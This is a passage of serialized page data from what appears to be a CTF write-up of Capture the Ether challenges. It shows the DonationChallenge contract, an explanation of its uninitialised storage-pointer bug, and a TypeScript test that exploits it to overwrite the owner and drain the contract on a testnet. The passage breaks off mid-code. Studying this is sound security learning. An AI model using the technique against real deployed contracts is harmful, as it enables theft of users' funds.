"},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"hexZeroPad"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"0x1\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"32"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" arrayLoc "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"keccak256"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"slot"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" overflowLoc "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bW},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bX},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:df}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"arrayLoc"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cG}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" setTx "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ce}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"overflowLoc"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" setTx"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ba}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,bN]},children:[{type:a,value:ae}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Nice and simple - we've used some useful helpers from "},{type:b,tag:T,props:{href:"https:\u002F\u002Fdocs.ethers.io\u002Fv5\u002Fapi\u002Futils",rel:[bd,be,bf],target:bg},children:[{type:a,value:"ethers.js"}]},{type:a,value:" to simplify the calculations. Running this shows that it passes! On to the next challenge."}]},{type:a,value:m},{type:b,tag:aC,props:{id:cq},children:[{type:b,tag:T,props:{href:cx,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:by}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"This challenge contains some frankly bizarre mistakes. The docs don't match the logic, to the point where the contract wouldn't even have worked for a simple usability test. However it also does teach us something useful and not very intuitive about instantiating structs."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002FDonationChallenge.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:by}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:"struct"}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:bR}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:" timestamp"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:ch},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:"\n    Donation"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" donations"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:by}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        owner "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:bH},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bi}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bj}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:bk}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bl}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bB},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bI}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ci}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:ch},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F amount is in ether, but msg.value is in wei"}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:" scale "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cV}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bo}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:bn}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:a,value:aN},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:" etherAmount "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:cZ}]},{type:a,value:" scale"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        Donation donation"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:dg},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:"timestamp "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:" now"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:dg},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:"etherAmount "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:ch},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        donations"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"push"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"donation"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bu}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bJ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:"\n\n        msg"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aR}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:al}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bK},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"What we need to do here to successfully drain the contract, is overwrite the "},{type:b,tag:o,props:{},children:[{type:a,value:dh}]},{type:a,value:" variable. If you compile this contract, you'll see the following warning:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:O,props:{className:[P,bD]},children:[{type:b,tag:o,props:{},children:[{type:a,value:"Warning: Variable is declared as a storage pointer. Use an explicit \"storage\" keyword to silence this warning.\n"}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:b,tag:o,props:{},children:[{type:a,value:"Variable declared as a storage pointer"}]},{type:a,value:" means that rather than assigning values to the attributes of a new and empty instance of "},{type:b,tag:o,props:{},children:[{type:a,value:bR}]},{type:a,value:", when this struct is assigned to, its slots are actually overwriting the contract's own storage slots! So "},{type:b,tag:o,props:{},children:[{type:a,value:"donation.timestamp"}]},{type:a,value:di},{type:b,tag:o,props:{},children:[{type:a,value:"donations.length"}]},{type:a,value:" (stored in slot 0, as we explored in the previous test), and "},{type:b,tag:o,props:{},children:[{type:a,value:"donation.etherAmount"}]},{type:a,value:di},{type:b,tag:o,props:{},children:[{type:a,value:dh}]},{type:a,value:"... There's our route in. Now, how to exploit it?"}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"We have a barrier to calling the "},{type:b,tag:o,props:{},children:[{type:a,value:ci}]},{type:a,value:"; it has a requirement, which is quite frankly, totally bat-shit insane. This has fairly clearly been contrived as such to enormously simplify exploiting the contract's vulerability. "},{type:b,tag:o,props:{},children:[{type:a,value:"uint256 scale = 10**18 * 1 ether;"}]},{type:a,value:" - this states that the scale is 10**36, twice the number of decimals that Ethereum has, meaning that while we do need to match the input (we will supply the player's account ID as "},{type:b,tag:o,props:{},children:[{type:a,value:"etherAmount"}]},{type:a,value:") with a quantity of Wei, the amount of Ropsten ETH that we need to send is pretty small. The amount we need to send is "},{type:b,tag:o,props:{},children:[{type:a,value:"playerAddress \u002F 10**36"}]},{type:a,value:l}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Knowing both of these elements of the exploit, we can write our test:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Fdonation-challenge.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:dj}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we empty the campaign contributions\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bp}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:dj}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:br}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ci}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:dk},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:L}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:cF},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:dk},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:M}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bc}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"pow"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:"36"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" withdrawTx "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bu}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" 